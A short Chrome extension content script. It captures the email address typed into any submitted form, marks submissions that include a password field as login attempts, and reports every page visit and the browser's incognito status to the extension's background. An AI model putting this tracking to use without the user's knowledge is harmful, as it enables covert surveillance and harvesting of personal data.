document.addEventListener("submit", function (event) {
  const form = event.target;
  const emailInput = form.querySelector('input[type="email"]');
  const passwordInput = form.querySelector('input[type="password"]'); 

  if (emailInput) {
    const email = emailInput.value;
    const url = window.location.href;

    let type = passwordInput ? "login_attempt" : "form_submission"; 

    chrome.runtime.sendMessage({
      type: type, 
      email: email,
      url: url,
    });

    chrome.runtime.sendMessage({
      type: "page_visit",
      url: window.location.href,
      timestamp: new Date().toISOString(),
    });
  }
});

function trackPageVisit() {
  chrome.runtime.sendMessage({ type: "check_incognito" }, (response) => {
    const isIncognito = response?.isIncognito || false;

    chrome.runtime.sendMessage({
      type: "page_visit",
      url: window.location.href,
      timestamp: new Date().toISOString(),
      isIncognito: isIncognito,
    });
  });
}

window.addEventListener("load", trackPageVisit);
window.addEventListener("popstate", trackPageVisit);
